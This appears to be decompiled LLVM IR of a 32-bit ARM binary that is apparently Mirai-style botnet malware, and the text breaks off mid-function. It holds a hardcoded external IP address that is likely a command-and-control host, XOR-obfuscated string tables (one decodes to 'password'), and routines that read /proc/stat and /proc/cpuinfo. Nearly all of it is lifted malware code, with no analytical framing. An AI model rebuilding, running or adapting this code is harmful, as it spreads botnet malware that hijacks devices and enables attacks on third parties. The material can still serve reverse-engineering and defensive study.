source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_d92c.14 = constant i32 -382906384
@global_var_1e6f8.19 = global i32 0
@global_var_82dc.20 = constant i32 -352321547
@global_var_12670.21 = constant i32 -382909968
@global_var_a048.27 = constant i32 -382906384
@global_var_a480.29 = constant i32 -382906384
@global_var_896c.31 = constant i32 -382906384
@global_var_c19c.33 = constant i32 -382906384
@global_var_baa4.35 = constant i32 -382906384
@global_var_b2f0.37 = constant i32 -382906384
@global_var_9a2c.40 = constant i32 -382906384
@global_var_9398.42 = constant i32 -382906384
@global_var_20780.45 = global i32 0
@global_var_15f4c.57 = constant i32 47
@global_var_20788.59 = global i32 0
@global_var_1e6fc.61 = global i32 0
@global_var_20784.63 = global i32 0
@global_var_109ac.65 = constant i32 -382910336
@global_var_d4ac.66 = constant i32 -509607932
@global_var_d7f4.68 = constant i32 -382910448
@global_var_15f50.74 = constant [15 x i8] c"178.62.235.153\00"
@global_var_20790.77 = local_unnamed_addr global i32 0
@global_var_2078e.78 = local_unnamed_addr global i32 0
@global_var_1e700.80 = global i32 0
@global_var_15f60.88 = constant i32 10
@global_var_10be0.94 = constant i32 -382910336
@global_var_15f64.97 = constant i32 16777216
@global_var_1e708.99 = global i32 0
@global_var_1e714.101 = global i32 0
@global_var_1e70c.103 = global i32 0
@global_var_1e710.105 = global i32 0
@global_var_1e74c.119 = global i32 0
@global_var_1e718.121 = global i32 0
@global_var_1e744.123 = global i32 0
@global_var_207a4.127 = global i32 0
@global_var_2079c.131 = global i32 0
@global_var_207a0.133 = global i32 0
@global_var_1e71e.136 = local_unnamed_addr global i32 0
@global_var_1e720.140 = local_unnamed_addr global i32 0
@global_var_1e724.141 = local_unnamed_addr global i32 0
@global_var_1e725.142 = local_unnamed_addr global i32 0
@global_var_1e73e.145 = local_unnamed_addr global i32 0
@global_var_15f70.147 = constant i32 0
@global_var_15f6c.149 = constant [5 x i8] c"&;; \00"
@global_var_15f74.151 = constant [5 x i8] c"5:?;\00"
@global_var_15f7c.153 = constant [9 x i8] c"<!: acam\00"
@global_var_15f88.155 = constant [7 x i8] c" 18:1 \00"
@global_var_15f90.157 = constant [8 x i8] c"0125!8 \00"
@global_var_15f98.159 = constant [9 x i8] c"$5''#;&0\00"
@global_var_15fa4.161 = constant [6 x i8] c"509=:\00"
@global_var_15fac.163 = constant [6 x i8] c"\22=.,\22\00"
@global_var_15fb4.165 = constant [8 x i8] c"'!$$;& \00"
@global_var_15fbc.167 = constant i32 423502179
@global_var_15fcc.169 = constant [6 x i8] c"efg`a\00"
@global_var_15fd4.171 = constant [5 x i8] c"!'1&\00"
@global_var_15fdc.173 = constant i32 943467547
@global_var_15fe8.175 = constant i32 322070023
@global_var_1e728.176 = local_unnamed_addr global i32 0
@global_var_1e726.177 = local_unnamed_addr global i32 0
@global_var_1e72c.178 = local_unnamed_addr global i32 0
@global_var_1e734.180 = local_unnamed_addr global i32 0
@global_var_1e740.181 = local_unnamed_addr global i32 0
@global_var_e304.183 = constant i32 -382910352
@global_var_15ff4.185 = constant [3 x i8] c"\0D\0A\00"
@global_var_16000.187 = constant i32 2096127
@global_var_15ff7.189 = constant i32 2095871
@global_var_207ac.195 = global i32 0
@global_var_16004.202 = constant [3 x i8] c"Qm\00"
@global_var_207b4.203 = local_unnamed_addr global i32 0
@global_var_207b8.204 = local_unnamed_addr global i32 0
@global_var_16008.206 = constant i32 59987
@global_var_207bc.207 = local_unnamed_addr global i32 0
@global_var_207c0.208 = local_unnamed_addr global i32 0
@global_var_160ec.210 = constant i32 808465680
@global_var_207c8.211 = local_unnamed_addr global i32 0
@global_var_207c4.212 = local_unnamed_addr global i32 0
@global_var_1600c.214 = constant [8 x i8] c"{$&;7{T\00"
@global_var_20814.215 = local_unnamed_addr global i32 0
@global_var_20818.216 = local_unnamed_addr global i32 0
@global_var_16014.218 = constant [6 x i8] c"{1,1T\00"
@global_var_2081c.219 = local_unnamed_addr global i32 0
@global_var_20820.220 = local_unnamed_addr global i32 0
@global_var_1601c.222 = constant [5 x i8] c"{20T\00"
@global_var_20828.223 = local_unnamed_addr global i32 0
@global_var_20824.224 = local_unnamed_addr global i32 0
@global_var_16024.226 = constant [7 x i8] c"{95$'T\00"
@global_var_2082c.227 = local_unnamed_addr global i32 0
@global_var_20830.228 = local_unnamed_addr global i32 0
@global_var_1602c.230 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_20834.231 = local_unnamed_addr global i32 0
@global_var_20838.232 = local_unnamed_addr global i32 0
@global_var_1603c.234 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_20894.235 = local_unnamed_addr global i32 0
@global_var_20898.236 = local_unnamed_addr global i32 0
@global_var_16048.238 = constant [8 x i8] c"z5:=91T\00"
@global_var_2089c.239 = local_unnamed_addr global i32 0
@global_var_208a0.240 = local_unnamed_addr global i32 0
@global_var_16050.242 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_20840.243 = local_unnamed_addr global i32 0
@global_var_2083c.244 = local_unnamed_addr global i32 0
@global_var_16064.246 = constant [9 x i8] c"5''#;&0T\00"
@global_var_20844.247 = local_unnamed_addr global i32 0
@global_var_20848.248 = local_unnamed_addr global i32 0
@global_var_1610c.250 = constant i32 557516544
@global_var_20850.251 = local_unnamed_addr global i32 0
@global_var_2084c.252 = local_unnamed_addr global i32 0
@global_var_16070.254 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_20858.255 = local_unnamed_addr global i32 0
@global_var_20854.256 = local_unnamed_addr global i32 0
@global_var_16084.258 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_20860.259 = local_unnamed_addr global i32 0
@global_var_2085c.260 = local_unnamed_addr global i32 0
@global_var_16094.262 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_20864.263 = local_unnamed_addr global i32 0
@global_var_20868.264 = local_unnamed_addr global i32 0
@global_var_160a4.266 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_20870.267 = local_unnamed_addr global i32 0
@global_var_2086c.268 = local_unnamed_addr global i32 0
@global_var_160b8.270 = constant [9 x i8] c"$662*7!E\00"
@global_var_20874.271 = local_unnamed_addr global i32 0
@global_var_20878.272 = local_unnamed_addr global i32 0
@global_var_160c4.274 = constant [6 x i8] c";3=:T\00"
@global_var_2087c.275 = local_unnamed_addr global i32 0
@global_var_20880.276 = local_unnamed_addr global i32 0
@global_var_160cc.278 = constant [7 x i8] c"1: 1&T\00"
@global_var_20884.279 = local_unnamed_addr global i32 0
@global_var_20888.280 = local_unnamed_addr global i32 0
@global_var_160d4.282 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_2088c.283 = local_unnamed_addr global i32 0
@global_var_20890.284 = local_unnamed_addr global i32 0
@global_var_10ca4.290 = constant i32 -443088884
@global_var_d4a0.306 = constant i32 27262984
@global_var_1e76c.308 = global i32 0
@global_var_110dc.310 = constant i32 -456978431
@global_var_208a4.322 = global i32 0
@global_var_11660.328 = constant i32 -478871519
@global_var_c580.332 = constant i32 -442695648
@global_var_120e0.343 = constant i32 -478805983
@global_var_124bc.352 = constant i32 -382906384
@global_var_1e750.360 = local_unnamed_addr global i32 0
@global_var_13f44.362 = constant i32 -509591552
@global_var_1e754.371 = local_unnamed_addr global i32 0
@global_var_14978.374 = constant i32 -382909968
@global_var_12d1c.375 = constant i32 -494075872
@global_var_10ba8.376 = constant i32 -382910336
@global_var_1613c.380 = constant [11 x i8] c"/proc/stat\00"
@global_var_16148.383 = constant i32 32
@global_var_1614c.386 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1615c.388 = constant [10 x i8] c"processor\00"
@global_var_16180.390 = constant i32 604672
@global_var_12edc.393 = constant i32 -369098421
@global_var_1e764.406 = local_unnamed_addr global i32 0
@global_var_1e768.408 = local_unnamed_addr global i32 0
@global_var_16184.411 = constant [10 x i8] c"/dev/null\00"
@global_var_128ec.412 = constant i32 -442543860
@global_var_148dc.417 = constant i32 -382910352
@global_var_11110.422 = constant i32 -369094630
@global_var_138a8.435 = constant i32 -335545128
@global_var_13d70.441 = constant i32 -382909456
@global_var_2077c.444 = local_unnamed_addr global i32 0
@global_var_16164.452 = constant i32 114
@global_var_14d9c.457 = constant i32 -382906384
@global_var_20003.466 = global i32 0
@global_var_20000.467 = global i32 0
@global_var_1487c.477 = constant i32 -509607926
@global_var_16490.482 = constant i32 0
@global_var_15d38.483 = constant i32 -382909968
@global_var_14bc0.493 = constant i32 -509607928
@global_var_1e6d8.2 = external global i8*
@global_var_1e6f4.17 = external global i8*
@global_var_1e6f5.25 = global i8 0
@1 = internal constant [4 x i8] c"8\E5\01\00"
@global_var_2078c.76 = global i16* null
@global_var_1e704.92 = external global i8*
@global_var_1e748.125 = global i16* null
@global_var_1e71c.135 = external global i8*
@global_var_1e730.138 = global i16 0
@global_var_1e73c.139 = local_unnamed_addr global i8 0
@global_var_1e732.143 = local_unnamed_addr global i16 0
@global_var_1e73d.144 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_8098)
  %v31_80a0 = load i32, i32* @r0, align 4
  ret i32 %v31_80a0
}

define i32 @function_80b0(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_1e6d8.2 to i32), i32* %r4.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1e6d8.2 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %dec_label_pc_80c4, label %dec_label_pc_80e0

dec_label_pc_80c4:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80d4 = call i32 @function_80ec()
  %v2_80dc = load i32, i32* %r4.global-to-local, align 4
  %v3_80dc = inttoptr i32 %v2_80dc to i8*
  store i8 1, i8* %v3_80dc, align 1
  %v2_80e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80e0

dec_label_pc_80e0:                                ; preds = %entry, %dec_label_pc_80c4
  %v2_80e0 = phi i32 [ %v2_80e0.pre, %dec_label_pc_80c4 ], [ %v3_80b0, %entry ]
  %.0 = phi i32 [ %v3_80d4, %dec_label_pc_80c4 ], [ undef, %entry ]
  store i32 %v2_80e0, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i8** @global_var_1e6d8.2, { 1, 0 }
  uselistorder label %dec_label_pc_80e0, { 1, 0 }
}

define i32 @function_80ec() local_unnamed_addr {
dec_label_pc_80ec:
  %v0_80f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80f0, label %bb, label %dec_label_pc_80ec._crit_edge

dec_label_pc_80ec._crit_edge:                     ; preds = %dec_label_pc_80ec
  br label %bb4

bb:                                               ; preds = %dec_label_pc_80ec
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80ec._crit_edge, %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8118 = load i32, i32* inttoptr (i32 124084 to i32*), align 4
  %v2_811c = icmp eq i32 %v2_8118, 0
  br i1 %v2_811c, label %dec_label_pc_8134, label %dec_label_pc_8124

dec_label_pc_8124:                                ; preds = %bb4
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8134

dec_label_pc_8134:                                ; preds = %bb4, %dec_label_pc_8124
  ret i32 124084

; uselistorder directives
  uselistorder label %dec_label_pc_8134, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_815c = ptrtoint i32* %stack_var_4 to i32
  %v8_817c = call i32 @function_13618(i32 ptrtoint (i32* @global_var_d92c.14 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 89916, i32 %arg1, i32 %v4_815c)
  %v0_8180 = call i32 @function_128ec()
  ret i32 %v0_8180
}

define i32 @function_8190(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8190:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8190 = icmp eq i32 %arg1, 0
  br i1 %v2_8190, label %dec_label_pc_81d8, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %dec_label_pc_8190
  %v0_81a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81a0 = add i32 %v0_81a0, 4
  %v2_81a0 = inttoptr i32 %v1_81a0 to i8*
  %v3_81a0 = load i8, i8* %v2_81a0, align 1
  %v4_81a0 = zext i8 %v3_81a0 to i32
  %v9_81a4 = icmp eq i32 %v4_81a0, %arg3
  br i1 %v9_81a4, label %dec_label_pc_81e4, label %dec_label_pc_81c8.preheader

dec_label_pc_81c8.preheader:                      ; preds = %dec_label_pc_81a0
  br label %dec_label_pc_81c8

dec_label_pc_81b8:                                ; preds = %dec_label_pc_81c8
  %v1_81b8 = add i32 %v0_81c0.in, 12
  %v2_81b8 = inttoptr i32 %v1_81b8 to i8*
  %v3_81b8 = load i8, i8* %v2_81b8, align 1
  %v4_81b8 = zext i8 %v3_81b8 to i32
  %v9_81bc = icmp eq i32 %v4_81b8, %arg3
  br i1 %v9_81bc, label %dec_label_pc_81e4, label %dec_label_pc_81c8

dec_label_pc_81c8:                                ; preds = %dec_label_pc_81c8.preheader, %dec_label_pc_81b8
  %v0_81c0.in = phi i32 [ %v0_81a0, %dec_label_pc_81c8.preheader ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v0_81c8 = phi i32 [ 0, %dec_label_pc_81c8.preheader ], [ %v1_81c8, %dec_label_pc_81b8 ]
  %v0_81c0 = add i32 %v0_81c0.in, 8
  %v1_81c8 = add i32 %v0_81c8, 1
  %v9_81cc = icmp eq i32 %v1_81c8, %arg1
  store i32 %v0_81c0, i32* %r1.global-to-local, align 4
  br i1 %v9_81cc, label %dec_label_pc_81d8, label %dec_label_pc_81b8

dec_label_pc_81d8:                                ; preds = %dec_label_pc_81c8, %dec_label_pc_8190, %dec_label_pc_81e4
  %v0_81d8 = phi i32 [ %arg4, %dec_label_pc_8190 ], [ %v2_81e4, %dec_label_pc_81e4 ], [ %arg4, %dec_label_pc_81c8 ]
  ret i32 %v0_81d8

dec_label_pc_81e4:                                ; preds = %dec_label_pc_81b8, %dec_label_pc_81a0
  %v0_81e4 = phi i32 [ %v0_81a0, %dec_label_pc_81a0 ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v1_81e4 = inttoptr i32 %v0_81e4 to i32*
  %v2_81e4 = load i32, i32* %v1_81e4, align 4
  br label %dec_label_pc_81d8

; uselistorder directives
  uselistorder i32 %v1_81c8, { 1, 0 }
  uselistorder i32 %v0_81c0, { 1, 0, 2 }
  uselistorder i32 %v0_81c0.in, { 1, 0 }
  uselistorder i32 %v0_81a0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_81d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_81c8, { 1, 0 }
}

define i32 @function_81ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_81ec:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_81ec = load i32, i32* @r4, align 4
  store i32 %v3_81ec, i32* %stack_var_-32, align 4
  %v6_81ec = load i32, i32* @r5, align 4
  %v9_81ec = load i32, i32* @r6, align 4
  %v12_81ec = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_8204 = call i32 @function_108d0()
  store i32 %v0_8204, i32* @r0, align 4
  %v7_8208 = icmp eq i32 %v0_8204, -1
  %tmp23 = icmp slt i32 %v0_8204, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_81ec
  br label %dec_label_pc_8228

bb24:                                             ; preds = %dec_label_pc_81ec
  %. = zext i1 %v7_8208 to i32
  store i32 %., i32* @r5, align 4
  %v2_8220 = icmp eq i1 %v7_8208, false
  br i1 %v2_8220, label %dec_label_pc_8230, label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %.thread2, %bb24
  %v2_8228 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8228, i32* @r4, align 4
  store i32 %v6_81ec, i32* @r5, align 4
  store i32 %v9_81ec, i32* @r6, align 4
  store i32 %v12_81ec, i32* @r7, align 4
  ret i32 %v0_8204

dec_label_pc_8230:                                ; preds = %bb24
  %v0_8230 = call i32 @function_108d0()
  %v7_8234 = icmp eq i32 %v0_8230, -1
  store i32 %v0_8230, i32* @r4, align 4
  br i1 %v7_8234, label %dec_label_pc_8264, label %dec_label_pc_8240

dec_label_pc_8240:                                ; preds = %dec_label_pc_8230
  %v2_8240 = icmp eq i32 %v0_8230, 0
  br i1 %v2_8240, label %dec_label_pc_8248, label %dec_label_pc_826c

dec_label_pc_8248:                                ; preds = %dec_label_pc_8240
  %v0_8248 = load i32, i32* @r6, align 4
  %v1_824c = call i32 @function_12cc8(i32 %v0_8248)
  store i32 %v1_824c, i32* @r0, align 4
  %v0_8250 = call i32 @function_107a4()
  %v2_8258 = call i32 @function_109ac(i32 %v0_8250, i32 9)
  %v0_825c = load i32, i32* @r4, align 4
  %v1_8260 = call i32 @function_12c10(i32 %v0_825c)
  br label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8230, %dec_label_pc_8248
  %v0_8264 = load i32, i32* @r5, align 4
  %v1_8268 = call i32 @function_12c10(i32 %v0_8264)
  br label %dec_label_pc_826c

dec_label_pc_826c:                                ; preds = %dec_label_pc_8240, %dec_label_pc_8264
  %v2_8270 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8270 = zext i8 %v2_8270 to i32
  %v2_8274 = icmp eq i8 %v2_8270, 0
  br i1 %v2_8274, label %dec_label_pc_82b8, label %dec_label_pc_827c

dec_label_pc_827c:                                ; preds = %dec_label_pc_826c
  %v2_8280 = load i32, i32* @global_var_1e6f8.19, align 4
  %v1_8284 = inttoptr i32 %v2_8280 to i32*
  %v2_8284 = load i32, i32* %v1_8284, align 4
  %v1_8288 = add i32 %v2_8284, 4
  %v2_8288 = inttoptr i32 %v1_8288 to i8*
  %v3_8288 = load i8, i8* %v2_8288, align 1
  %v4_8288 = zext i8 %v3_8288 to i32
  %v1_828c = load i32, i32* @r7, align 4
  %v9_828c = icmp eq i32 %v4_8288, %v1_828c
  br i1 %v9_828c, label %dec_label_pc_82c0, label %dec_label_pc_82ac.preheader

dec_label_pc_82ac.preheader:                      ; preds = %dec_label_pc_827c
  %v1_8290 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ac

dec_label_pc_829c:                                ; preds = %dec_label_pc_82ac
  %v4_829c = mul i32 %v1_82ac, 4
  %v5_829c = add i32 %v4_829c, %v2_8280
  %v6_829c = inttoptr i32 %v5_829c to i32*
  %v7_829c = load i32, i32* %v6_829c, align 4
  %v1_82a0 = add i32 %v7_829c, 4
  %v2_82a0 = inttoptr i32 %v1_82a0 to i8*
  %v3_82a0 = load i8, i8* %v2_82a0, align 1
  %v4_82a0 = zext i8 %v3_82a0 to i32
  %v9_82a4 = icmp eq i32 %v4_82a0, %v1_828c
  br i1 %v9_82a4, label %dec_label_pc_82c0, label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_82ac.preheader, %dec_label_pc_829c
  %v0_82ac = phi i32 [ %v1_8290, %dec_label_pc_82ac.preheader ], [ %v1_82ac, %dec_label_pc_829c ]
  %v1_82ac = add i32 %v0_82ac, 1
  %v9_82b0 = icmp eq i32 %v1_82ac, %v3_8270
  br i1 %v9_82b0, label %dec_label_pc_82b8, label %dec_label_pc_829c

dec_label_pc_82b8:                                ; preds = %dec_label_pc_82ac, %dec_label_pc_826c, %dec_label_pc_82c0
  %v1_82bc = call i32 @function_12c10(i32 0)
  %v0_82d0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_82c0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_829c, %dec_label_pc_827c, %dec_label_pc_82b8
  %v0_82d0 = phi i32 [ %v2_8284, %dec_label_pc_827c ], [ %v0_82d0.pre, %dec_label_pc_82b8 ], [ %v7_829c, %dec_label_pc_829c ]
  %v1_82d0 = inttoptr i32 %v0_82d0 to i32*
  %v2_82d0 = load i32, i32* %v1_82d0, align 4
  call void @__pseudo_branch(i32 %v2_82d0)
  br label %dec_label_pc_82b8

; uselistorder directives
  uselistorder i32 %v1_82ac, { 2, 0, 1 }
  uselistorder i32 %v0_8230, { 1, 2, 0 }
  uselistorder i1 %v7_8208, { 1, 0 }
  uselistorder i32 %v0_8204, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_82c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_826c, { 1, 0 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
  uselistorder label %dec_label_pc_8228, { 1, 0 }
}

define i32 @function_82e8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_82e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_82e8 = load i32, i32* @r5, align 4
  %v9_82e8 = load i32, i32* @r6, align 4
  %v12_82e8 = load i32, i32* @r7, align 4
  %v18_82e8 = load i32, i32* @sb, align 4
  %v21_82e8 = load i32, i32* @sl, align 4
  %v24_82e8 = load i32, i32* @fp, align 4
  %v2_82ec = icmp ugt i32 %arg2, 2
  %v7_82ec = icmp eq i32 %arg2, 3
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_82f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_82f8, i32* @r5, align 4
  %v2_82fc = xor i1 %v7_82ec, true
  %v3_82fc = and i1 %v2_82ec, %v2_82fc
  br i1 %v3_82fc, label %dec_label_pc_830c, label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_834c, %.dec_label_pc_8300_crit_edge, %dec_label_pc_8340, %dec_label_pc_8330, %dec_label_pc_830c, %dec_label_pc_82e8, %dec_label_pc_84f8
  %v1_8308 = phi i32 [ %v1_8308.pre, %.dec_label_pc_8300_crit_edge ], [ %v1_8310, %dec_label_pc_834c ], [ %v1_8310, %dec_label_pc_8340 ], [ %v1_8310, %dec_label_pc_8330 ], [ %v1_8310, %dec_label_pc_830c ], [ %v0_82f8, %dec_label_pc_82e8 ], [ %v0_84fc, %dec_label_pc_84f8 ]
  store i32 %v6_82e8, i32* @r5, align 4
  store i32 %v9_82e8, i32* @r6, align 4
  store i32 %v12_82e8, i32* @r7, align 4
  store i32 %v18_82e8, i32* @sb, align 4
  store i32 %v21_82e8, i32* @sl, align 4
  store i32 %v24_82e8, i32* @fp, align 4
  ret i32 %v1_8308

dec_label_pc_830c:                                ; preds = %dec_label_pc_82e8
  %v1_830c = inttoptr i32 %v0_82f8 to i32*
  %v2_830c = load i32, i32* %v1_830c, align 4
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v1_8310 = and i32 %v2_830c, 16711680
  store i32 %v1_8310, i32* %r0.global-to-local, align 4
  %v3_8314 = udiv i32 %v2_830c, 16777216
  %v4_8318 = udiv i32 %v1_8310, 256
  %v5_8318 = or i32 %v4_8318, %v3_8314
  %v1_831c = and i32 %v2_830c, 65280
  store i32 %v1_831c, i32* %r2.global-to-local, align 4
  %v4_8320 = mul nuw nsw i32 %v1_831c, 256
  %v5_8320 = or i32 %v5_8318, %v4_8320
  store i32 %v5_8320, i32* %r3.global-to-local, align 4
  %v7_8324 = icmp eq i32 %arg2, 4
  store i1 %v7_8324, i1* %cpsr_z.global-to-local, align 1
  %v5_8328 = call i32 @llvm.bswap.i32(i32 %v2_830c)
  store i32 %v5_8328, i32* @fp, align 4
  br i1 %v7_8324, label %dec_label_pc_8300, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %dec_label_pc_830c
  %v1_8330 = add i32 %v0_82f8, 4
  %v2_8330 = inttoptr i32 %v1_8330 to i8*
  %v3_8330 = load i8, i8* %v2_8330, align 1
  %v4_8330 = zext i8 %v3_8330 to i32
  store i32 %v4_8330, i32* %r2.global-to-local, align 4
  %v7_8334 = icmp eq i32 %arg2, 5
  store i1 %v7_8334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8334, label %dec_label_pc_8300, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_8330
  %v1_8340 = add i32 %v0_82f8, 5
  %v2_8340 = inttoptr i32 %v1_8340 to i8*
  %v3_8340 = load i8, i8* %v2_8340, align 1
  %v4_8340 = zext i8 %v3_8340 to i32
  store i32 %v4_8340, i32* @sb, align 4
  %v2_8344 = icmp eq i8 %v3_8340, 0
  store i1 %v2_8344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8344, label %dec_label_pc_8300, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_8340
  %v2_8350 = mul nuw nsw i32 %v4_8340, 5
  store i32 %v2_8350, i32* @r7, align 4
  %v1_8354 = add i32 %arg2, -6
  store i32 %v1_8354, i32* %r3.global-to-local, align 4
  %v3_8358 = icmp ult i32 %v1_8354, %v2_8350
  %v9_8358 = icmp eq i32 %v1_8354, %v2_8350
  store i1 %v9_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8358, label %dec_label_pc_8300, label %dec_label_pc_8360

dec_label_pc_8360:                                ; preds = %dec_label_pc_834c
  store i32 %v4_8340, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8354, i32* @r6, align 4
  %v2_836c = call i32 @function_11f24(i32 %v4_8340, i32 24)
  store i32 %v2_836c, i32* @ip, align 4
  %v0_8378 = load i32, i32* @r7, align 4
  %v1_8378 = load i32, i32* @r4, align 4
  %v2_8378 = sub i32 %v1_8378, %v0_8378
  store i32 %v2_8378, i32* @r7, align 4
  %v0_837c = load i32, i32* @r5, align 4
  %v1_837c = add i32 %v0_837c, 11
  store i32 %v1_837c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8380, %dec_label_pc_8360
  %v1_8384 = phi i32 [ %v1_83b0, %dec_label_pc_8380 ], [ %v2_836c, %dec_label_pc_8360 ]
  %v0_8380 = phi i32 [ %v1_83ac, %dec_label_pc_8380 ], [ %v1_837c, %dec_label_pc_8360 ]
  %v1_8380 = add i32 %v0_8380, -5
  %v2_8380 = inttoptr i32 %v1_8380 to i32*
  %v3_8380 = load i32, i32* %v2_8380, align 4
  store i32 %v3_8380, i32* %r1.global-to-local, align 4
  %v2_8384 = add i32 %v1_8384, 16
  %v3_8384 = inttoptr i32 %v2_8384 to i32*
  store i32 %v3_8380, i32* %v3_8384, align 4
  %v0_8388 = load i32, i32* @r7, align 4
  %v1_8388 = add i32 %v0_8388, -6
  store i32 %v1_8388, i32* %r3.global-to-local, align 4
  %v0_838c = load i32, i32* %r0.global-to-local, align 4
  %v1_838c = add i32 %v0_838c, -1
  %v2_838c = inttoptr i32 %v1_838c to i8*
  %v3_838c = load i8, i8* %v2_838c, align 1
  %v4_838c = zext i8 %v3_838c to i32
  store i32 %v4_838c, i32* %r2.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v1_8390 = add i32 %v0_8390, -5
  store i32 %v1_8390, i32* @r6, align 4
  %v9_8394 = icmp eq i32 %v1_8390, %v1_8388
  store i1 %v9_8394, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_838c, i32* @r4, align 4
  %v2_83a0 = load i32, i32* @ip, align 4
  %v3_83a0 = add i32 %v2_83a0, 20
  %v4_83a0 = inttoptr i32 %v3_83a0 to i8*
  store i8 %v3_838c, i8* %v4_83a0, align 1
  %v0_83a4 = load i32, i32* %r1.global-to-local, align 4
